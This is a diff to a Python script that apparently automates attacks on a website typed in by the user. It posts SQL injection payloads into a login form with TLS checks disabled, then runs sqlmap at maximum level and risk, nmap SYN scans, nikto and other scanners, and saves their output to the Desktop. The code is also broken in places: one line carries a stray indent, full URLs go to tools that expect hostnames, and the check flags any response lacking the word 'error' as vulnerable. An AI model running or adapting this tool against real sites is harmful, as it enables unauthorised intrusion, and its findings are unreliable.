@@ -70,6 +70,20 @@ def print_header():
     """
     print(header)
 
+def check_website_status(url):
+    """Check if the website is accessible."""
+    try:
+        response = requests.get(url, verify=False)
+        if response.status_code == 200:
+            print(f"The website {url} is accessible.")
+            return True
+        else:
+            print(f"The website {url} is not accessible. Status code: {response.status_code}")
+            return False
+    except requests.RequestException as e:
+        print(f"An error occurred: {e}")
+        return False
+
 def perform_sql_injection(target_url):
     """Perform SQL Injection using the provided payloads."""
     payloads = [
@@ -91,6 +105,7 @@ def perform_sql_injection(target_url):
         "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
     ]
 
+    vulnerable = False
     for payload in payloads:
         data = {
             'username': f'admin{payload}',
@@ -99,11 +114,16 @@ def perform_sql_injection(target_url):
 
         try:
             response = requests.post(target_url, data=data, verify=False)  # Disabling SSL verification
-            print(response.text)  # This will display the extracted data, handle it as you wish
+            if "error" not in response.text.lower():  # Adjust this check based on actual SQL error messages
+                vulnerable = True
+                print(f"Possible SQL Injection vulnerability detected with payload: {payload}")
+                break
         except SSLError as e:
             print(f"SSL Error: {e}")
         except RequestException as e:
             print(f"Request Error: {e}")
+
+    return vulnerable
 
 def main():
     install_tools()
@@ -114,43 +134,47 @@ def main():
     # Print the header
     print_header()
 
-    link = input("Target: ")
-    link_with_https = f"https://{link}"
+        target_url = input("Enter the URL of the website to check: ")
+    if not target_url.startswith("http://") and not target_url.startswith("https://"):
+        target_url = "https://" + target_url
     
-    # Determine the desktop path
-    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
-    target_dir = os.path.join(desktop_path, link)
-    os.makedirs(target_dir, exist_ok=True)
-    output_file = os.path.join(target_dir, "domain.txt")
-    
-        # Clear the file if it exists
-    open(output_file, 'w').close()
-
-    tools = {
-        "subfinder": f"subfinder -d {link} -o {output_file}",
-        "sqlmap": f"sqlmap -u {link_with_https} --batch --level=5 --risk=3",
-        "uniscan": f"uniscan -u {link_with_https} -qweds",
-        "nmap": f"nmap -sS -sV {link}",
-        "nikto": f"nikto -h {link_with_https}",
-        "whois": f"whois {link}"
-    }
-    
-    # Execute each tool
-    for tool, command in tools.items():
-        print(f"Running {tool}...")
-        stdout, stderr = run_command(command.split())
+    if check_website_status(target_url):
+        if perform_sql_injection(target_url):
+            print(f"The website {target_url} is vulnerable to SQL Injection.")
+        else:
+            print(f"The website {target_url} is not vulnerable to SQL Injection.")
         
-        if stdout:
-            save_to_file(output_file, f"Output of {tool}:\n{stdout}")
-        if stderr:
-            save_to_file(output_file, f"Errors from {tool}:\n{stderr}")
-    
-    # Perform SQL injection
-    print("Performing SQL Injection tests...")
-    perform_sql_injection(link_with_https)
-    
-    print(f"All tasks completed. Results saved in {output_file}")
+        # Determine the desktop path
+        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+        target_dir = os.path.join(desktop_path, target_url.replace("https://", "").replace("http://", ""))
+        os.makedirs(target_dir, exist_ok=True)
+        output_file = os.path.join(target_dir, "domain.txt")
+        
+        # Clear the file if it exists
+        open(output_file, 'w').close()
+
+        tools = {
+            "subfinder": f"subfinder -d {target_url} -o {output_file}",
+            "sqlmap": f"sqlmap -u {target_url} --batch --level=5 --risk=3",
+            "uniscan": f"uniscan -u {target_url} -qweds",
+            "nmap": f"nmap -sS -sV {target_url}",
+            "nikto": f"nikto -h {target_url}",
+            "whois": f"whois {target_url}"
+        }
+        
+        # Execute each tool
+        for tool, command in tools.items():
+            print(f"Running {tool}...")
+            stdout, stderr = run_command(command.split())
+            
+            if stdout:
+                save_to_file(output_file, f"Output of {tool}:\n{stdout}")
+            if stderr:
+                save_to_file(output_file, f"Errors from {tool}:\n{stderr}")
+        
+        print(f"All tasks completed. Results saved in {output_file}")
+    else:
+        print("The website is not accessible. Please check the URL and try again.")
 
 if __name__ == "__main__":
     main()
-    
